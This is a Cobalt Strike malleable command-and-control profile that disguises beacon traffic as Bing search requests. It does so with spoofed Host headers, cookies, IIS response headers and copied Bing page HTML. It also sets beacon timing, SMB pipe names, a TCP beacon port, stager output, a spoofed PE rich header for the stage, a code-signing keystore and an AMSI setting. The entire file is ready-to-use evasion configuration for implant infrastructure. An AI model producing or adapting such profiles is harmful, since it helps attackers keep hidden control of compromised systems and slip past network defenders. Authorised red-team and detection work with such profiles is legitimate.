# CobaltStrike 4.0+ Test Profile
#
# References:
#   * https://www.cobaltstrike.com/help-malleable-c2
#   * https://www.cobaltstrike.com/help-malleable-postex
#
# Author: lengyi@HongHuLab
# Github: https://github.com/lengjibo
#
### Global Option Block
set sample_name "lengyi.profile";  # Profile name

set sleeptime "30000";   # Sleep time for the beacon callback
# set sleeptime "<60000>"; # 1  Minute
# set sleeptime "<70000>"; 
# set sleeptime "<80000>"; 

set jitter "50"; # Jitter to set %. In this example, the beacon will callback between 15 and 30 sec jitter

set dns_idle "8.8.4.4";
set dns_sleep "0";
set maxdns    "235";

set host_stage "true";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set useragent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)"; # User-Agent
 
### Self-Signed Certificate HTTPS

https-certificate {
    set CN       "us"; 
    set O        "us";   
    set C        "us";
    set L        "us";
    set OU       "us";  
    set ST       "us";
    set validity "365";
}

### Valid SSL Certificate HTTPS

https-certificate {
    set keystore "zzhsec.store";
    set password "lengyi";
}

### Code Signing Certificate 

code-signer {
    set keystore "keystore.jks";
    set password "123456";
    set alias "server";
}

### HTTP/S Global Response Header 

http-config {
    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        # HTTP header 
    header "Server" "Microsoft-IIS/8.0";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Cache-Control" "max-age=1";
    header "Connection" "keep-alive";
    header "X-Powered-By" "ASP.NET";
    set trust_x_forwarded_for "false";           # "true" if the team server is behind an HTTP redirector
}

### SMB Beacon 

set pipename "win_svc";            
set pipename_stager "win_svc";     

### TCP Beacon 

set tcp_port "1337";                    # TCP beacon listen port

### HTTP-GET

http-get {

    set uri "/search/";

    client {

        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG"; 
        
        metadata {
            base64url;
            parameter "q";
        }

        parameter "go" "Search";
        parameter "qs" "bs";
        parameter "form" "QBRE";


    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}

### HTTP-POST

http-post {
    
    set uri "/Search/";
    set verb "GET";

    client {

        header "Host" "www.bing.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "DUP=Q=GpO1nJpMnam4UllEfmeMdg2&T=283767088&A=1&IG"; 
        
        output {
            base64url;
            parameter "q";
        }
        
        parameter "go" "Search";
        parameter "qs" "bs";
        
        id {
            base64url;
            parameter "form";
        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"><script type=\"text/javascript\">//<![CDATA[si_ST=new Date;//]]></script><head><!--pc--><title>Bing</title><meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /><link href=\"/search?format=rss&amp;q=canary&amp;go=Search&amp;qs=bs&amp;form=QBRE\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /><link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /><script type=\"text/javascript\">//<![CDATA[";
            append "G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"53\",IG:\"4C1158CCBAFC4896AD78ED0FF0F4A1B2\",EventID:\"E37FA2E804B54C71B3E275E9589590F8\",MN:\"SERP\",V:\"web\",P:\"SERP\",DA:\"CO4\",SUIH:\"OBJhNcrOC72Z3mr21coFQw\",gpUrl:\"/fd/ls/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http://www.bing.com/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+\"IG=\"+_G.IG+\"&\"+a;}return true;};//]]></script><style type=\"text/css\">.sw_ddbk:after,.sw_ddw:after,.sw_ddgn:after,.sw_poi:after,.sw_poia:after,.sw_play:after,.sw_playa:after,.sw_playd:after,.sw_playp:after,.sw_st:after,.sw_sth:after,.sw_ste:after,.sw_st2:after,.sw_plus:after,.sw_tpcg:after,.sw_tpcw:after,.sw_tpcbk:after,.sw_arwh:after,.sb_pagN:after,.sb_pagP:after,.sw_up:after,.sw_down:after,.b_expandToggle:after,.sw_calc:after,.sw_fbi:after,";
            print;
        }
    }
}

### HTTP-stager 

http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Connection" "close";

        output {                                                                                         
            prepend "user=";              
            append ".asp";                
            print;                          
        }
    }
}

### Stage

stage {
	set checksum       "0";
	set image_size_x86 "559966";
	set image_size_x64 "559966";
    set entry_point    "38807";
	set rich_header    "\xcd\x11\x8f\xf8\x89\x70\xe1\xab\x89\x70\xe1\xab\x89\x70\xe1\xab\x3d\xec\x10\xab\x9c\x70\xe1\xab\x3d\xec\x12\xab\x0a\x70\xe1\xab\x3d\xec\x13\xab\x90\x70\xe1\xab\xea\x2d\xe2\xaa\x9b\x70\xe1\xab\xea\x2d\xe4\xaa\xae\x70\xe1\xab\xea\x2d\xe5\xaa\x9b\x70\xe1\xab\x80\x08\x72\xab\x82\x70\xe1\xab\x89\x70\xe0\xab\x03\x70\xe1\xab\xe7\x2d\xe4\xaa\x80\x70\xe1\xab\xe7\x2d\x1e\xab\x88\x70\xe1\xab\x89\x70\x76\xab\x88\x70\xe1\xab\xe7\x2d\xe3\xaa\x88\x70\xe1\xab\x52\x69\x63\x68\x89\x70\xe1\xab\x00\x00\x00\x00\x00\x00\x00\x00";
}

### Post-Exploitation

post-ex {
    set amsi_disable "false";   # Disable AMSI 
}
